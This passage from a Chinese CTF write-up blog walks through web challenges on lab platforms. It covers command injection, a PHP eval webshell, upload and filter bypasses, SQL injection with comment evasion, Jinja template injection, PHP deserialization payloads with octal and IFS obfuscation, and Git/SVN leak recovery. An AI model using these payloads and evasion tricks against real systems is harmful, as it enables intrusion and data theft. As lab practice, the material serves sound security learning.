class="variable">$_c</span>=<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$_c</span>)-<span class="number">1</span>);</span><br><span class="line">	<span class="variable">$a</span>=<span class="variable">$a</span>.<span class="variable">$_c</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strrev</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p><code>flag:&#123;NSCTF_b73d5adfb819c64603d7237fa0d52977&#125;</code></p>
<h2 id="command-execution-x2F-Cyberpeace-n3k0-2"><a href="#command-execution-x2F-Cyberpeace-n3k0-2" class="headerlink" title="command_execution&#x2F;Cyberpeace-n3k0(2)"></a>command_execution&#x2F;Cyberpeace-n3k0(2)</h2><p>命令注入，用<code>&amp;</code>连接</p>
<p>在&#x2F;home目录下有一个flag.txt，得到flag</p>
<p><img data-src="https://img-blog.csdnimg.cn/c56f875e3657446bba4fc07b013f82ac.png" alt="在这里插入图片描述"></p>
<p><code>cyberpeace&#123;49782780ee64f5453147468a72161f08&#125;</code></p>
<h2 id="webshell-x2F-Cyberpeace-n3k0-2"><a href="#webshell-x2F-Cyberpeace-n3k0-2" class="headerlink" title="webshell&#x2F;Cyberpeace-n3k0(2)"></a>webshell&#x2F;Cyberpeace-n3k0(2)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">你会使用webshell吗？</span><br><span class="line">&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>用hackbar传参数shell就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell=system(&quot;ls&quot;);</span><br><span class="line">flag.txt index.php</span><br><span class="line">shell=system(&quot;cat flag.txt&quot;);</span><br></pre></td></tr></table></figure>

<p><code>cyberpeace&#123;3bdaaca4709609b1c356b98ba243db0b&#125;</code></p>
<h2 id="xff-referer-x2F-Cyberpeace-n3k0-2"><a href="#xff-referer-x2F-Cyberpeace-n3k0-2" class="headerlink" title="xff_referer&#x2F;Cyberpeace-n3k0(2)"></a>xff_referer&#x2F;Cyberpeace-n3k0(2)</h2><p>提示<code>ip地址必须为123.123.123.123</code>，需要修改<code>X-Forwarded-For</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For 是一个 HTTP 扩展头部，主要是为了让 Web 服务器获取访问用户的真实 IP 地址，但是这个IP却未必是真实的</span><br><span class="line">X-Forwarded-For: client1, proxy1, proxy2</span><br><span class="line">第一项为真实的客户端ip，剩下的就是曾经经过的代理或负载均衡的ip地址，经过几个就会出现几个</span><br></pre></td></tr></table></figure>

<p>提示<code>必须来自https://www.google.com</code>，需要修改Referer</p>
<p>得到flag</p>
<p><code>cyberpeace&#123;edf5ae233479849e3d4896efda7155bd&#125;</code></p>
<h2 id="upload1-2"><a href="#upload1-2" class="headerlink" title="upload1(2)"></a>upload1(2)</h2><p>把如下php文件后缀改成png，然后在上传的时候bp抓包把文件名改回成php</p>
<p>用御剑连接后，在上一级目录下有<code>flag.php</code>，打开就能得到flag</p>
<p><code>cyberpeace&#123;9d2d0b1dcdaa91db15aa5b668a95e7bd&#125;</code></p>
<h2 id="very-easy-sql-x2F-CTF-3"><a href="#very-easy-sql-x2F-CTF-3" class="headerlink" title="very_easy_sql&#x2F;CTF(3)"></a>very_easy_sql&#x2F;CTF(3)</h2><p>这一题和之前<a href="#very-easy-sql-x2F-CTF-1">标星号</a>的一样</p>
<h2 id="favorite-number-3"><a href="#favorite-number-3" class="headerlink" title="favorite_number(3)"></a>favorite_number(3)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//php5.5.9</span></span><br><span class="line"><span class="variable">$stuff</span> = <span class="variable">$_POST</span>[<span class="string">&quot;stuff&quot;</span>];</span><br><span class="line"><span class="variable">$array</span> = [<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$stuff</span> === <span class="variable">$array</span> &amp;&amp; <span class="variable">$stuff</span>[<span class="number">0</span>] != <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$num</span>= <span class="variable">$_POST</span>[<span class="string">&quot;num&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^\d+$/im&quot;</span>,<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/sh|wget|nc|python|php|perl|\?|flag|&#125;|cat|echo|\*|\^|\]|\\\\|&#x27;|\&quot;|\|/i&quot;</span>,<span class="variable">$num</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;my favorite num is:&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo &quot;</span>.<span class="variable">$num</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Bonjour!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大致的思路是stuff用某个漏洞传一个数组，num用&amp;传一个命令注入</p>
<p>提示了php5.5.9，说明存在漏洞，查了一下，是整数溢出漏洞</p>
<p><a href="https://bugs.php.net/bug.php?id=69892">PHP :: Bug #69892 :: Different arrays compare indentical due to integer key truncation</a></p>
<p>即，当数组为九位16机制数时，会溢出，等同于重新排序，16的8次方即4294967296在逻辑上等同于下标0；</p>
<p>所以需要传<code>stuff[4294967296]=admin&amp;stuff[1]=user</code></p>
<p>正则表达式<code>/^\d+$/im</code>的含义是</p>
<p><code>^ $</code>：边界符</p>
<p><code>\d+</code>：一个或多个数字</p>
<p><code>i</code>：不区分大小写</p>
<p><code>m</code>：多行匹配</p>
<p>preg_match 函数用于进行正则表达式匹配，返回 pattern 的匹配次数，它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后将会停止搜索。</p>
<p>所以当启动多行匹配时，第二行会导致命令执行，而<code>%0a</code>就相当于<code>;</code></p>
<p>传<code>num=1%0als /</code></p>
<p>这里用hackbar好像不行，需要用bp抓hackbar的包，看了一下，缺少的是Referer字段</p>
<p>在<code>/</code>目录下就有flag文件</p>
<p>但是这里把cat、echo、flag都ban了</p>
<p>可以用这些查看</p>
<p><img data-src="https://img2020.cnblogs.com/blog/2556426/202112/2556426-20211211222605581-737618577.png" alt="img"></p>
<p>而文件名被ban的情况下，可以用inode索引号来匹配文件，使用<code>ls -i</code>可以看到inode号</p>
<p><code>18497049 flag</code></p>
<p>使用下列命令查看flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tac `find / -inum 18497049`</span><br><span class="line">这里用的是反引号，表示命令替换，命令替换是指Shell可以先执行``中的命令，将输出结果暂时保存，在适当的地方输出</span><br></pre></td></tr></table></figure>

<p>但是结果504了？</p>
<p>尝试其它方法</p>
<p>用printf将命令写入一个文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf /fla &gt; /tmp/hello</span><br><span class="line">printf g &gt;&gt; /tmp/hello</span><br><span class="line">tac `tac /tmp/hello`</span><br><span class="line"></span><br><span class="line"># printf /fla &gt; /tmp/hello %26%26 printf g &gt;&gt; /tmp/hello %26%26 tac `tac /tmp/hello`</span><br></pre></td></tr></table></figure>

<p>可以得到flag</p>
<p>还有一个方法使用全局变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=/fla;b=g;tac $a$b</span><br></pre></td></tr></table></figure>

<p><code>cyberpeace&#123;e59c6f6c33936dec616de49d44d8d3f2&#125;</code></p>
<h2 id="fakebook-x2F-网鼎杯2018-3"><a href="#fakebook-x2F-网鼎杯2018-3" class="headerlink" title="fakebook&#x2F;网鼎杯2018(3)"></a>fakebook&#x2F;网鼎杯2018(3)</h2><p>不太会，看看<a href="https://blog.csdn.net/m0_62063669/article/details/125404398">大佬的WP</a></p>
<p>先查看robots.txt，可以看到有<code>/user.php.bak</code>，访问并下载文件</p>
<p>可以看到判断合法blog的函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function isValidBlog ()</span><br><span class="line">&#123;</span><br><span class="line">    $blog = $this-&gt;blog;</span><br><span class="line">    return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要blog字段满足http(s):&#x2F;&#x2F;(数字&#x2F;字母一个以上).(字母2-6个):(数字一个以上)或者(非空字符0次以上)，忽略大小写</p>
<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://baidu.com</span><br></pre></td></tr></table></figure>

<p>成功添加</p>
<p><img data-src="/../images/WRITEUP/image-20220916102952876.png" alt="image-20220916102952876"></p>
<p>点击链接可以看到url中<code>?no=1</code></p>
<p>猜测存在sql注入，输入<code>&#39;</code>报错</p>
<p>用sqlmap注一下，没有结果，只能手工注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by 5报错，说明有4个字段</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,4显示no hack ~_~</span><br><span class="line">尝试绕过，用/**/</span><br><span class="line">?no=-1/**/union/**/select/**/1,database(),3,4--+</span><br><span class="line">发现字段2是注入点，显示数据库名fakebook</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20220916111128542.png" alt="image-20220916111128542"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1/**/union/**/select/**/1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#x27;fakebook&#x27;</span><br><span class="line">表名users</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20220916141845150.png" alt="image-20220916141845150"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1/**/union/**/select/**/1,group_concat(column_name),3,4 from information_schema.columns where table_schema=&#x27;fakebook&#x27;</span><br><span class="line">列名：no,username,passwd,data</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20220916142609446.png" alt="image-20220916142609446"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1/**/union/**/select/**/1,group_concat(username,passwd),3,4 from users</span><br><span class="line">这里username\passwd就是之前操作生成的</span><br><span class="line">?no=-1/**/union/**/select/**/1,group_concat(data),3,4 from users</span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:2:&quot;ad&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:12:&quot;http://1.com&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20220916145142826.png" alt="image-20220916145142826"></p>
<p>这里用dirsearch扫描可以看到flag.php，且和view.php在同一目录下。</p>
<p><img data-src="/../images/WRITEUP/image-20220916143348493.png" alt="image-20220916143348493"></p>
<p>这里有两种方法查看flag.php文件</p>
<p>1.用<code>file:///</code>协议来读取&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1/**/union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:2:&quot;ad&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>查看源码，可以看到iframe标签里有base64加密的字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PD9waHANCg0KJGZsYWcgPSAiZmxhZ3tjMWU1NTJmZGY3NzA0OWZhYmY2NTE2OGYyMmY3YWVhYn0iOw0KZXhpdCgwKTsNCg==</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20220916145656766.png" alt="image-20220916145656766"></p>
<p>解密后可以得到flag（可以在控制台使用atob()函数解密，btoa加密）</p>
<p><img data-src="/../images/WRITEUP/image-20220916145719137.png" alt="image-20220916145719137"></p>
<p><img data-src="/../images/WRITEUP/image-20220916150027334.png" alt="image-20220916150027334"></p>
<p>2.sql语句中LOAD_FILE()函数可以读取一个文件并将其内容作为字符串返回</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1/**/union /**/select 1,load_file(&#x27;/var/www/html/flag.php&#x27;),3,4</span><br></pre></td></tr></table></figure>

<p>flag在源码中</p>
<p><img data-src="/../images/WRITEUP/image-20220916143115357.png" alt="image-20220916143115357"></p>
<p><code>flag&#123;c1e552fdf77049fabf65168f22f7aeab&#125;</code></p>
<h2 id="shrine-x2F-CTF-3"><a href="#shrine-x2F-CTF-3" class="headerlink" title="shrine&#x2F;CTF(3)"></a>shrine&#x2F;CTF(3)</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">app = flask.Flask(__name__) </span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read() </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>): </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>): </span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>) </span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>] </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s </span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine)) </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p><code>/shrine/</code>这个路径存在模板注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:51191/shrine/&#123;&#123;1+1&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20220919103910033.png" alt="image-20220919103910033"></p>
<p>这里把config过滤了，但是可以用url_for或者get_flashed_messages读取全局变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__&#125;&#125;</span><br><span class="line">/shrine/&#123;&#123;get_flashed_messages.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20220919104610404.png" alt="image-20220919104610404"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125;</span><br><span class="line">/shrine/&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20220919104700241.png" alt="image-20220919104700241"></p>
<p><code>flag&#123;shrine_is_good_ssti&#125;</code></p>
<h2 id="easytornado-x2F-护网杯-3"><a href="#easytornado-x2F-护网杯-3" class="headerlink" title="easytornado&#x2F;护网杯(3)"></a>easytornado&#x2F;护网杯(3)</h2><h2 id="unseping-x2F-江苏工匠杯-1"><a href="#unseping-x2F-江苏工匠杯-1" class="headerlink" title="unseping&#x2F;江苏工匠杯(1)"></a>unseping&#x2F;江苏工匠杯(1)</h2><p><a href="https://www.pudn.com/news/634a7fc12aaf6043c92a4a0a.html">参考</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ease</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;ping&quot;</span>))) &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">array</span>(<span class="variable">$this</span>, <span class="variable">$this</span>-&gt;method), <span class="variable language_">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ping</span>(<span class="params"><span class="variable">$ip</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$ip</span>, <span class="variable">$result</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/&quot;</span>, <span class="variable">$str</span>, <span class="variable">$pat_array</span>)) <span class="comment">//过滤了 | &amp; ; space /</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;don&#x27;t hack&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;args <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;args[<span class="variable">$k</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">waf</span>(<span class="variable">$v</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctf</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$ctf</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>大致流程是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">传参-&gt;反序列化-&gt;construct()-&gt;wakeup()填充args-&gt;destruct()赋method值ping-&gt;ping()</span><br></pre></td></tr></table></figure>

<p>所以要传的参数<code>CTF</code>需要</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat flag=&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>查看文件的方法</p>
<p><img data-src="/../images/WRITEUP/image-20221025104923960.png" alt="image-20221025104923960"></p>
<p>文件名替换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用inode索引号来匹配文件，使用`ls -i`可以看到inode号</span><br><span class="line">tac `find / -inum 18497049`</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用全局遍历</span><br><span class="line">a=/fla;b=g;tac $a$b</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/Michael177/article/details/124639138">linux默认环境变量</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls被ban：可以用空的环境变量绕过，例如`l&#123;z&#125;s`</span><br><span class="line">$&#123;IFS&#125;默认指定space,tab,换行</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img data-src="/../images/WRITEUP/image-20221025113050809.png" alt="image-20221025113050809"></p>
<p><code>Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoxNDoibCR7en1zJHtJRlN9LWwiO319</code></p>
<p>用POST方法传base64编码后的结果</p>
<p><img data-src="/../images/WRITEUP/image-20221025112957162.png" alt="image-20221025112957162"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">其中第一列d代表目录，l代表连接文件,b代表设备文件</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20221025113304312.png" alt="image-20221025113304312"></p>
<p><code>Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoyODoibCR7en1zJHtJRlN9ZmxhJHt6fWdfMXNfaGVyZSI7fX0=</code></p>
<p><img data-src="/../images/WRITEUP/image-20221025112537059.png" alt="image-20221025112537059"></p>
<p>但是这里<code>/</code>和<code>;</code>都被过滤了，该如何读取php内容？</p>
<p>可以使用8进制ascii码替换命令，例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls-&gt;$(printf &quot;\154\163&quot;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s=&#x27;cat flag_1s_here/flag_831b69012c67b35f.php&#x27;</span><br><span class="line">for i in s:</span><br><span class="line">	print(oct(ord(i))[2:],end=&quot;\\&quot;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat flag_1s_here/flag_831b69012c67b35f.php</span><br><span class="line">\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20221025174912561.png" alt="image-20221025174912561"></p>
<p><code>Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoxNjk6IiQocHJpbnRmJHtJRlN9IlwxNDNcMTQxXDE2NFw0MFwxNDZcMTU0XDE0MVwxNDdcMTM3XDYxXDE2M1wxMzdcMTUwXDE0NVwxNjJcMTQ1XDU3XDE0NlwxNTRcMTQxXDE0N1wxMzdcNzBcNjNcNjFcMTQyXDY2XDcxXDYwXDYxXDYyXDE0M1w2Nlw2N1wxNDJcNjNcNjVcMTQ2XDU2XDE2MFwxNTBcMTYwIikiO319</code></p>
<p><img data-src="/../images/WRITEUP/image-20221025174028059.png" alt="image-20221025174028059"></p>
<p>得到flag</p>
<p><code>cyberpeace&#123;29898fce096dde11f0f088c612f9ce32&#125;</code></p>
<h1 id="CTFHUB"><a href="#CTFHUB" class="headerlink" title="CTFHUB"></a>CTFHUB</h1><h2 id="Vim缓存"><a href="#Vim缓存" class="headerlink" title="Vim缓存"></a>Vim缓存</h2><p>1.当vim在编辑文档的过程中如果异常退出，则会产生缓存文件。第一次产生的缓存文件后缀为.swp，第二次则产生的缓存文件后缀为.swo,第三次产生的缓存文件后缀为.swn。</p>
<p>2.使用命令vim -r 可以查看当前目录下的所有swp文件。</p>
<p>3.使用命令vim -r filename可以恢复文件，这样上次意外退出并且没有保存的修改，就可以覆盖文件。</p>
<p>4.调用这类的隐藏文件的时候，需要在最前面加.(如删除index.php.swp，则需要rm -fr* .index.php.swp).</p>
<p>5.vim使用的缓存存储是一种固定的二进制文件，我们可以通过curl命令，或者vim命令进行查看。</p>
<p>访问<code>.index.php.swp</code>，得到缓存文件，在linux中cat查看就能得到flag</p>
<p><code>ctfhub&#123;3f74df4bc6d20b7acea2c1ec&#125;</code></p>
<h2 id="Git泄露-Log"><a href="#Git泄露-Log" class="headerlink" title="Git泄露-Log"></a>Git泄露-Log</h2><p>使用<a href="https://github.com/BugScanTeam/GitHack">GitHack工具</a>下载<code>.git</code>文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py http://challenge-eb02ac897a8ff3e2.sandbox.ctfhub.com:<span class="number">10800</span>/.git</span><br></pre></td></tr></table></figure>

<p>在生成的目录下使用<code>git log</code>命令获取日志</p>
<p><img data-src="/../images/WRITEUP/image-20221018152310501.png" alt="image-20221018152310501"></p>
<p>使用<code>git diff </code>查看提交比对可以得到flag</p>
<p><img data-src="/../images/WRITEUP/image-20221018152715932.png" alt="image-20221018152715932"></p>
<p>或者使用<code>git reset --hard 708f5a182dc058cd0af233e2d6758f10644622a3</code>回退到<code>add flag</code>版本，多了一个文档，打开就可以得到flag</p>
<p><img data-src="/../images/WRITEUP/image-20221018153135503.png" alt="image-20221018153135503"></p>
<p><code>ctfhub&#123;e35a6a61ed75f63fd03f4577&#125;</code></p>
<h2 id="Git泄露-Stash"><a href="#Git泄露-Stash" class="headerlink" title="Git泄露-Stash"></a>Git泄露-Stash</h2><p>与上题类似，使用GitHack下载源码，然后用<code>git log</code>查看日志</p>
<p><img data-src="/../images/WRITEUP/image-20221018170808109.png" alt="image-20221018170808109"></p>
<p>但是此次直接用<code>git diff</code>查看无新增文件</p>
<p><img data-src="/../images/WRITEUP/image-20221018170842923.png" alt="image-20221018170842923"></p>
<p>用<code>git reset</code>回退版本生成了文档，但是也没有flag</p>
<p><img data-src="/../images/WRITEUP/image-20221018170920992.png" alt="image-20221018170920992"></p>
<p>其实<code>stash</code>是缓存的意思</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将本地没提交的内容(git commit的内容不会被缓存 但git add的内容会被缓存)进行缓存并从当前分支移除，缓存的数据结构为堆栈，先进后出</span><br></pre></td></tr></table></figure>

<p>使用<code>git stash list</code>查看缓存记录</p>
<p><img data-src="/../images/WRITEUP/image-20221018171013771.png" alt="image-20221018171013771"></p>
<p>使用<code>git stash pop</code>可以弹出最新 stash 的内容，并删除该 stash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果想要指定弹出某个 stash，可以使用：</span><br><span class="line">git stash pop stash@&#123;$num&#125; </span><br></pre></td></tr></table></figure>

<p>使用<code>git stash apply</code>也会将最新的改动还原到代码中，默认返回 stash{0}，与pop不同的是apply 不会删除 stash{0}</p>
<p>这里使用二者都可以，发现文档内容发生改变，得到flag</p>
<p><img data-src="/../images/WRITEUP/image-20221018171228336.png" alt="image-20221018171228336"></p>
<p><img data-src="/../images/WRITEUP/image-20221018171315925.png" alt="image-20221018171315925"></p>
<p><code>ctfhub&#123;69ac1262b1f2cfab32c09553&#125;</code></p>
<h2 id="Git泄露-Index"><a href="#Git泄露-Index" class="headerlink" title="Git泄露-Index"></a>Git泄露-Index</h2><p>直接GitHack就能得到带flag的文档</p>
<p><img data-src="/../images/WRITEUP/image-20221018171612316.png" alt="image-20221018171612316"></p>
<p><code>ctfhub&#123;2b8c264edd050a99208d58ad&#125;</code></p>
<h2 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SVN是subversion的缩写，是一个开放源代码的版本控制系统</span><br></pre></td></tr></table></figure>

<p>下载<code>dvcs-ripper</code>工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/kost/dvcs-ripper</span><br></pre></td></tr></table></figure>

<p>安装相关组件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</span><br></pre></td></tr></table></figure>

<p>使用工具进行处理</p>
